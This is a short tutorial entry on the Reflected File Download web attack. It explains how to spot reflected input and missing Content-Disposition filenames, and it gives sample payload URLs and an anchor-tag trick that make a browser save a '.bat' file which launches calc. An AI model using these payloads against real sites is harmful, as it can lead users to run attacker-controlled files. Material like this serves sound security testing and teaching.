## Reflected File Download (RFD)

## Introduction
Reflected File Download (RFD) is web based attack that extends reflected attacks beyond the context of the web browser. Attackers can build malicious URLs which once accessed, download files, and store them with any desired extension, giving a new malicious meaning to reflected input, even if it is properly escaped.

## Where to find
You can detect Reflected File Download (RFD) everywhere but there are 2 things that need to be looked up.
- Finding reflected input (For example: JSONP Callback)
- We can control the filename (there are several requirements that must be met)
  - Make sure that the `Content-Disposition` header does not include the `filename` attribute.
  
    ```
    Content-Disposition: attachment;
    ```

  - If there isn't any `Content-Disposition` header, you can use download attributes in the `<a>` tag. For example, like this:

    ```
    <a download href="https://example/api/?id=1&outputtype=json&callback=||calc||">Press Here</a>
    ```

## How to exploit
1. Basic payload
```
http://example.com/api;/evil.bat;?callback=||calc||
```

"The browser will download the `evil.bat` file, and if you open the `.bat` file, the calculator will pop up.

## References
* [Paper: Reflected File Download a New Web Attack Vector](https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view?resourcekey=0-NV7cTUTB48bltMEddlULLg)
* [Reflected File Download(RFD) Vulnerability. What? How?](https://medium.com/@Johne_Jacob/rfd-reflected-file-download-what-how-6d0e6fdbe331)